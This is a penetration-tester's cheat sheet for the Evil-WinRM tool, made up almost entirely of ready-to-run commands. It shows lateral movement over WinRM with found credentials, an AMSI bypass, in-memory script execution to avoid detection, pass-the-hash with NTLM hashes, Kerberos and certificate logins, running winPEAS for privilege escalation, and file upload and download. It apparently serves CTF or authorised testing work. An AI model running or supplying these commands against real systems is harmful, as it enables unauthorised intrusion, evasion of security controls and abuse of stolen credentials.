# Evil-WinRM 

## Link: https://github.com/Hackplayers/evil-winrm

## Port: 5985 (Over HTTP) 5986 (Over HTTPS)

## TIP: Use -S flag to enable SSL. Use this when the WinRM port is 5986 (Over HTTPS)

### Do lateral movement via WinRM protocol using found credentials with evil-winrm

### In your Evil-WinRM session, when authenticating you can use a folder from your local machine as a source to run powershell scripts

    evil-winrm -i TARGET_IP -u USER -p PASSWORD -s /path/to/PowerSharpBinaries

### Bypass AMSI using the command within the session:

    Bypass-4MSI

### Then you can run scripts from memory (DO NOT WRITE ON DISK UNLESS ABSOLUTELY NECESSARY!)

## Authentication Methods

#### 1) Clear text Password

     evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD

#### 2) Certificate (.pfx file)

     openssl pkcs12 -in USER_PFX_CERT.pfx -nocerts -out key.pem -nodes

       openssl pkcs12 -in USER_PFX_CERT.pfx -nokeys -out cert.pem

### After generating the private key from the .pfx file, we use Evil-WinRM to authenticate

    evil-winrm -i TARGET_IP -c CERT.pem -k KEY.pem -S

#### 3) Kerberos

    kinit USERNAME@DOMAIN.LOCAL (Authenticate and retrieve a ticket on Windows)
  
    impacket-getTGT DOMAIN.LOCAL/USERNAME:PASSWORD (Request a TGT ticket on Linux)

 Configure /etc/krb5.conf file with the appropriate settings (Replace some of the placeholders for your use case)

       [libdefaults]
        default_realm = DOMAIN.LOCAL
        ticket_lifetime = 24h
        renew_lifetime = 7d
        forwardable = true
        dns_lookup_realm = false
        dns_lookup_kdc = true

       [realms]
       DOMAIN.local = {
        kdc = IP or Hostname of KDC/Domain Controller
        admin_server = IP or Hostname of Admin Server
       }

       [domain_realm]
        .domain.local = DOMAIN.LOCAL
        domain.local = DOMAIN.LOCAL

### 

    evil-winrm -r DOMAIN.LOCAL -i DC.DOMAIN.LOCAL (Authenticate via kerberos)

#### 4) NTLM Authentication (Pass-the-Hash)

    evil-winrm -i TARGET_IP -u USER -H NTLM_HASH

#### 5) Authenticate using IPv6 address (In case firewall blocks IPv4 traffic on port 5985)

    evil-winrm -i [IPv6] -u USER -p PASSWORD

### TIP: Enter the IPv6 in your /etc/hosts file and give it a hostname (preferably the target machine name)

#### 6) Store logs with Evil-WinRM

    evil-winrm -i IP -u administrator -p Password@987 -l

Logs will be saved to 

    /home/user/evil-winrm-logs
    or
    /root/evil-winrm-logs

#### 7) Run executables in Evil-WinRM sessions

    evil-winrm -i IP -u administrator -p Password@987 -e /opt/privsc
    Bypass-4MSI
    menu
    Invoke-Binary /opt/privsc/winPEASx64.exe

#### 8) Service Enumeration

    menu
    services

#### 9) File Transfer

Upload a file from our system to target machine

    upload /home/user/test.txt .

Download a file from target machine to our system

    download test.txt /home/user/test.txt

#### 10) Use Evil-WinRM from Docker

    docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i IP -u Administrator -p 'Password@987'

